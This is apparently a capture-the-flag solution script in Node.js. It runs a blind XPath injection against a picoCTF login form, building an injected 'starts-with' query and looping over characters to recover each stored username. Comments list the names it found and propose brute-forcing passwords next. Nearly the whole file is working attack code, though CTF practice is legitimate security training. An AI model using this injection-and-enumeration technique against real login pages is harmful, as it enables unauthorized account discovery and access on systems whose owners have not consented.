
import fs   from 'fs';
import http from 'http';



const CHARSET = '_abcdefghijklmnopqrstuvwxyz1234567890';

const USERS = {};

const writeUsers = () => {
	fs.writeFileSync('usernames.json', JSON.stringify(USERS, null, '\t'));
};

const check_username = (user_id, username, callback) => {

	let payload = "";

	payload += "name=" + encodeURIComponent("' or //user[position()=" + user_id + "]/name[starts-with(text(), '" + username + "')] or 'a'='");
	payload += "&pass=whatever"; // TODO: Bruteforce this!?

	let request = http.request('http://mercury.picoctf.net:28065/', {
		headers: {
			'Content-Length': payload.length,
			'Content-Type': 'application/x-www-form-urlencoded'
		},
		method: 'POST'
	}, (response) => {

		const chunks = [];

		response.on('data', (data) => chunks.push(data));
		response.on('end', () => {

			let html = Buffer.concat(chunks).toString('utf8');
			if (html.includes('You&#39;re on the right path.') === true) {

				if (USERS[user_id] === undefined) {
					USERS[user_id] = username;
				} else if (username.length > USERS[user_id].length) {
					USERS[user_id] = username;
				}

				writeUsers();
				callback(true);

			} else if (html.includes('Login failure.') === true) {
				callback(false);
			}

		});

	});

	request.on('error', (err) => {
		console.error(user_id, err);
	});

	request.end(payload);

};

const bruteforce_username = (user_id, prefix) => {

	CHARSET.split('').forEach((character) => {

		check_username(user_id, prefix + character, (result) => {

			if (result === true) {
				bruteforce_username(user_id, prefix + character);
				console.log('user #' + user_id + ' starts with \"' + prefix + character + '\"');
			}

		});

	});

};


bruteforce_username(1, '');
bruteforce_username(2, '');
bruteforce_username(3, '');

// We found out:
// - user id=1 is named "guest"
// - user id=2 is named "bob"
// - user id=3 is named "admin"

